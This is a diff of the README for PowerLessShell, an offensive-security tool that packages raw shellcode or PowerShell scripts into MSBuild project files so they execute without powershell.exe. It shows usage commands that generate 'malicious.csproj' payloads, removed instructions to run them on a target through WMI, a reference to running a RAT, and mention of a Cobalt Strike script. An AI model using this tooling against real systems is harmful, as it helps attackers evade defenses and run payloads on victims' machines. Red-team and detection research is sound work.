@@ -27,114 +27,61 @@ https://docs.microsoft.com/en-us/visualstudio/msbuild/property-functions
 
 # Usage
 
-Raw shellcode
+PowerLessShell use commandline argument to generate the final file.
+
 ```
-$ python PowerLessShell.py
+$ python PowerLessShell.py -h
+PowerLessShell Less is More
+Mr.Un1k0d3r RingZer0 Team
+-----------------------------------------------------------
+usage: PowerLessShell.py [-h] [-type TYPE] -source SOURCE -output OUTPUT
+                         [-arch ARCH] [-condition CONDITION]
 
-
-PowerLessShell - Remain Stealth
-         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team
-            ___
-        .-"; ! ;"-.
-      .'!  : | :  !`.
-     /\  ! : ! : !  /\
-    /\ |  ! :|: !  | /\
-   (  \ \ ; :!: ; / /  )
-  ( `. \ | !:|:! | / .' )
-  (`. \ \ \!:|:!/ / / .')
-   \ `.`.\ |!|! |/,'.' /
-    `._`.\\!!!// .'_.'
-       `.`.\|//.'.'
-        |`._`n'_.'|
-        `----^----"
-
-
-(Set payload type 'powershell, shellcode')>>> shellcode
-
-(Path to the raw shellcode file)>>> shellcode.raw
-
-(Path for the generated MsBuild out file)>>> payload.csproj
-
-(Set USERDOMAIN condition (Default ''))>>> RingZer0
-
-(Use known process name to perform MsBuild renaming (Default: False))>>>
-
-[+] payload.csproj was generated.
-[+] payload.csproj.bat was generated.
-[+] Run the command inside of payload.csproj.cmd on the target system using WMI.
+optional arguments:
+  -h, --help            show this help message and exit
+  -type TYPE            Payload type (shellcode/powershell) default to:
+                        shellcode
+  -source SOURCE        Path to the source file (raw shellcode or powershell
+                        script)
+  -output OUTPUT        MSBuild output filename
+  -arch ARCH            Shellcode architecture (32/64) default to: 32
+  -condition CONDITION  XML Compiling condition default (Check for USERDOMAIN)
+                        default is: none
 ```
 
-Powershell
+Generating a powershell payload
 ```
-$ python PowerLessShell.py
-
-
-PowerLessShell - Remain Stealth
-         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team
-            ___
-        .-"; ! ;"-.
-      .'!  : | :  !`.
-     /\  ! : ! : !  /\
-    /\ |  ! :|: !  | /\
-   (  \ \ ; :!: ; / /  )
-  ( `. \ | !:|:! | / .' )
-  (`. \ \ \!:|:!/ / / .')
-   \ `.`.\ |!|! |/,'.' /
-    `._`.\\!!!// .'_.'
-       `.`.\|//.'.'
-        |`._`n'_.'|
-        `----^----"
-
-
-(Set payload type 'powershell, shellcode')>>> powershell
-
-(Path to the PowerShell script)>>> payload.ps1
-
-(Path for the generated MsBuild out file)>>> payload.csproj
-
-(Set USERDOMAIN condition (Default ''))>>>
-
-(Use known process name to perform MsBuild renaming (Default: False))>>>
-
-[+] payload.csproj was generated.
-[+] payload.csproj.bat was generated.
-[+] Run the command inside of payload.csproj.cmd on the target system using WMI.
+$ python PowerLessShell.py -type powershell -source script.ps1 -output malicious.csproj
+PowerLessShell Less is More
+Mr.Un1k0d3r RingZer0 Team
+-----------------------------------------------------------
+Generating the msbuild file using include/template-powershell.csproj as the template
+File 'malicious.csproj' created
+Process completed
 ```
 
-Inline command
+Generating a shellcode payload
 ```
-python PowerLessShell.py powershell.ps1 output (optional shellcode, -knownprocess)
-
-
-PowerLessShell - Remain Stealth
-         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team
-            ___
-        .-"; ! ;"-.
-      .'!  : | :  !`.
-     /\  ! : ! : !  /\
-    /\ |  ! :|: !  | /\
-   (  \ \ ; :!: ; / /  )
-  ( `. \ | !:|:! | / .' )
-  (`. \ \ \!:|:!/ / / .')
-   \ `.`.\ |!|! |/,'.' /
-    `._`.\\!!!// .'_.'
-       `.`.\|//.'.'
-        |`._`n'_.'|
-        `----^----"
-
-
-
-
-[+] output was generated.
-[+] output.bat was generated.
-[+] Run the command inside of output.cmd on the target system using WMI.
+$ python PowerLessShell.py -source shellcode.raw -output malicious.csproj
+PowerLessShell Less is More
+Mr.Un1k0d3r RingZer0 Team
+-----------------------------------------------------------
+Generating the msbuild file using include/template-shellcode.csproj as the template
+File 'malicious.csproj' created
+Process completed
 ```
 
-# Example
-
-The following example is running the RC4 RAT https://github.com/Mr-Un1k0d3r/RC4-PowerShell-RAT without running a single instance of PowerShell
-
-![PowerLessShell](https://ringzer0team.com/powershellless.png)
+Generating a 64 bits shellcode payload
+```
+$ python PowerLessShell.py -source shellcode64.raw -output malicious.csproj -arch 64
+PowerLessShell Less is More
+Mr.Un1k0d3r RingZer0 Team
+-----------------------------------------------------------
+Generating the msbuild file using include/template-shellcode.csproj as the template
+Generating a payload for a 64 bits shellcode! Don't forget to use the 64 bits version of msbuild.exe
+File 'malicious.csproj' created
+Process completed
+```
 
 # Cobalt Strike Aggressor script (wmi_msbuild.cna) 
 By Alyssa (ramen0x3f) and MrT-F
